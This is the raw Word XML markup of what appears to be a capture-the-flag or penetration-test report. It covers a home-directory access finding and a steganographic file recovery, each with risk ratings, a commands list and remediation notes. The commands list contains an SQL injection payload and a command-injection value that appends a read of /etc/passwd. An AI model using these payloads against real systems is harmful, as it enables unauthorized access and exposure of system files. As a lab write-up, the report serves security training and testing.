          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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_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}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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isk Rat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ng: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ium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| C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VS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 xml:space="preserve"> S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e: 6.5</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Summa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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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nu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er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spacing w:val="-3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on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 xml:space="preserve">l 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ser</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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ectori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v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spacing w:val="-3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ed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se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si</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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v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e pe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so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 xml:space="preserve">l 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pacing w:val="-3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 xml:space="preserve">n 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/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ho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/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/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nking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/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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37"/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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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A c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eckl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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.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 xml:space="preserve">x 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ile</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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spacing w:val="-3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in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rr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upt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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da</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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li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k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 xml:space="preserve">ely </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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nten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ed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pacing w:val="-3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 xml:space="preserve">o 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 xml:space="preserve">e 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spacing w:val="-3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ent.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>oo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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/C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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mma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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ds</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>U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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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QLi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y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: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'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OR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1=1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#</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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127.0.0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.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1;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/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/p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ss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w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d</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37"/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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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me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a</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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ssh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@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&lt;ta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ge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_I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&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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cd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/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me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/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moo</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37"/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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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, c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,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cd</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>omm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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nd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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>R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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>m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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>on:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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tr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 xml:space="preserve">ict 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 xml:space="preserve">o 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 xml:space="preserve">ser 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ho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 xml:space="preserve">me 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cto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ies.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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spacing w:val="-3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or f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spacing w:val="-3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un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x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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ect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in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y ar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 xml:space="preserve">cts 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 xml:space="preserve">n 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se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="2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-c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nt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olled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sp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ce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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1039" w:right="7274"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>3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.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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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S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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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ega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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>g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rap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-4"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>h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ic</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-4"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>F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i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>l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e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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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R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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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very</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Fl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 xml:space="preserve">g </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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ent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ie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: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FL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G{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x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spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>y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_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e_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spacing w:val="-3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}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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isk Rat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ng: Hi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g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| C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VS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 xml:space="preserve"> S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e: 8.1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Summa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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:right="1543" w:hanging="36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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>•</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:tab/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wo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iles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w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ere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ec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v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ered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m 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JPE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G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ge, i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clu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ng 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me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o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ent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il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ing sp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heet, i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ca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ing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da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nc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lm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nt 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policy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v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io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io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s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>oo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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/C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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mma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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ds</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
